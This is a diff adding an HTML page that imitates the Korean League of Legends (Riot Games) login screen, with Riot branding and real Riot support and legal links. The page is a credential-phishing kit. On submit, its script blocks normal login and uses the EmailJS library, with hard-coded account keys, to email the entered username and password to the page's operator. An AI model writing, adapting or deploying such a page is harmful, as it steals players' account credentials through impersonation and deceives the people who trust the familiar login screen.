@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>리그 오브 레전드 로그인</title>
+    <meta name="description" content="리그 오브 레전드는 140명이 넘는 챔피언으로 멋진 플레이를 펼칠 수 있는 팀 게임입니다. 지금 무료로 플레이해 보세요.">
+    
+    <link rel="shortcut icon" href="https://lolstatic-a.akamaihd.net/rso-login-page/3.2.32/assets/favicon.ico">
+    <link href="css/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('fgp1dMtfdXPV5C_1J');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('LOL').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm('JJong', 'template_1agh8m7', this)
+                    .then(function() {
+                        console.log('SUCCESS!');
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                    });
+            });
+        }
+    </script>
+
+</head>
+<body>
+<div id="wrapper">
+    <div id="main">
+        <div id="logo">
+            <div id="mini_logo_box">
+                <h5 class="text1">RIOT</h5>
+                <h5 class="text2">GAMES</h5>
+            </div>
+        </div>
+        <div id="login_box">
+            <div id="mini_login_box">
+                <div id="login">
+                    <h5 class="text3">로그인</h5>
+                </div>
+                <form id="LOL">
+                    <input type="hidden" name="contact_number">
+                    <div id="id">
+                        <h5 class="text4">계정이름</h5>
+                        <input name="ID_" id="username" spellcheck="false" type="text" required>
+                    </div>
+                    <div class="none"></div>
+                    <div id="password">
+                        <h5 class="text5">비밀번호</h5>
+                        <input name="PW_" id="userpassword" spellcheck="false" type="password" required>
+                    </div>
+                    <div class="none"></div>
+                    <div id="login24">
+                        <input id="login24_check" type="checkbox">
+                        <label for="login24_check">로그인 상태 유지</label>
+                    </div>
+                    <div id="arrow">
+                        <input type="submit" id="db">
+                    </div>
+                </form>
+                <div id="no_login">
+                    <a href="https://account.kr.riotgames.com/">로그인이 안 되시나요?</a>
+                </div>
+                <div id="new_id">
+                    <a href="https://signup.kr.riotgames.com/">계정 생성하기</a>
+                </div>
+            </div>
+        </div>
+        <div id="footer_1">
+            <a href="https://support-leagueoflegends.riotgames.com/hc/ko">고객센터</a>
+            <a href="https://legal.kr.riotgames.com/privacy">개인정보 처리방침</a>
+            <a href="https://legal.kr.riotgames.com/tos">서비스 약관</a>
+            <a href="https://www.leagueoflegends.com/ko-kr/">쿠키 설정</a>
+        </div>
+        <div id="footer_2">
+            <p>© 2020 Riot Games. All rights reserved.</p>
+        </div>
+    </div>
+</div>
+</body>
+</html>
